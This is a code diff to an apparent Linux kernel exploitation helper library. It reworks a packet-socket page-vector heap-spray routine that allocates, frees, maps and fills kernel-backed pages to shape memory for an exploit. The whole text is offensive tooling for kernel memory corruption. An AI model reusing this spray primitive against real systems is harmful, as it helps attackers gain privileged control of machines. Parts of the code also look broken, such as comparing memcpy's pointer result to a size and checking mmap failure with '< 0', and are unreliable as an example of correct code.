@@ -523,7 +523,7 @@ typedef struct pgv_frame{
     size_t size;
 }pgvFrame;
 
-pgvFrame pgv[INITIAL_PG_VEC_SPRAY];
+pgvFrame pgv[INITIAL_PG_VEC_SPRAY] = {};
 u64 PGV_SHARE_AREA = 0x13200000;
 
 int _pvg_sock(uint32_t size, uint32_t n)
@@ -581,26 +581,28 @@ void _spray_comm_handler()
         {
             pgv[req.idx].fd = _pvg_sock(PAGE_SIZE * (1<<req.order), req.nr);
             FAIL(pgv[req.idx].fd <= 0,"[-] PGV not allocated");
+            pgv[req.idx].size = PAGE_SIZE * (1<<req.order) * req.nr ;
         }
         else if (req.cmd == FREE)
         {
-            close(pgv[req.idx].fd);
+            close(pgv[req.idx].fd);   
         }
         else if(req.cmd == MAP){
             FAIL(pgv[req.idx].fd <= 0,"[-] PGV not allocated");
-            void *mapped = mmap(NULL, PAGE_SIZE * (1<<req.order) * req.nr , PROT_READ | PROT_WRITE, MAP_SHARED, pgv[req.idx].fd, 0);
+            void *mapped = mmap(NULL, pgv[req.idx].size , PROT_READ | PROT_WRITE, MAP_SHARED, pgv[req.idx].fd, 0);
             FAIL(mapped < 0,"[-] FAILED to MAP PGV");
             pgv[req.idx].mapped = mapped;
-            pgv[req.idx].size   = PAGE_SIZE * (1<<req.order) * req.nr;
         }else if(req.cmd == EDIT){
-            FAIL( (req.order) > 4, "Fix libx to add this feature!");
-
-            size_t target_size = pgv[req.idx].size;
             size_t fram_size   = PAGE_SIZE * (1<<req.order);
+            FAIL( (req.order) > 4, "Fix libx to add this feature!");
+            FAIL( pgv[req.idx].fd <= 0 || pgv[req.idx].size < fram_size || pgv[req.idx].mapped == 0 ,"[-] PGV not allocated" );
+            size_t target_size = pgv[req.idx].size;
+            info(hex(fram_size));
+            info(hex(target_size));
             u64 offset = 0;
-            for(offset = 0 ; offset < target_size - fram_size ; offset+=fram_size){
+            for(offset = 0 ; offset < target_size - fram_size ; offset += fram_size)
                 FAIL_IF( fram_size != memcpy(pgv[req.idx].mapped + offset, PGV_SHARE_AREA, fram_size ));
-            }
+            
         }
         result = req.idx;
         write(pg_vec_parent[1], &result, sizeof(result));
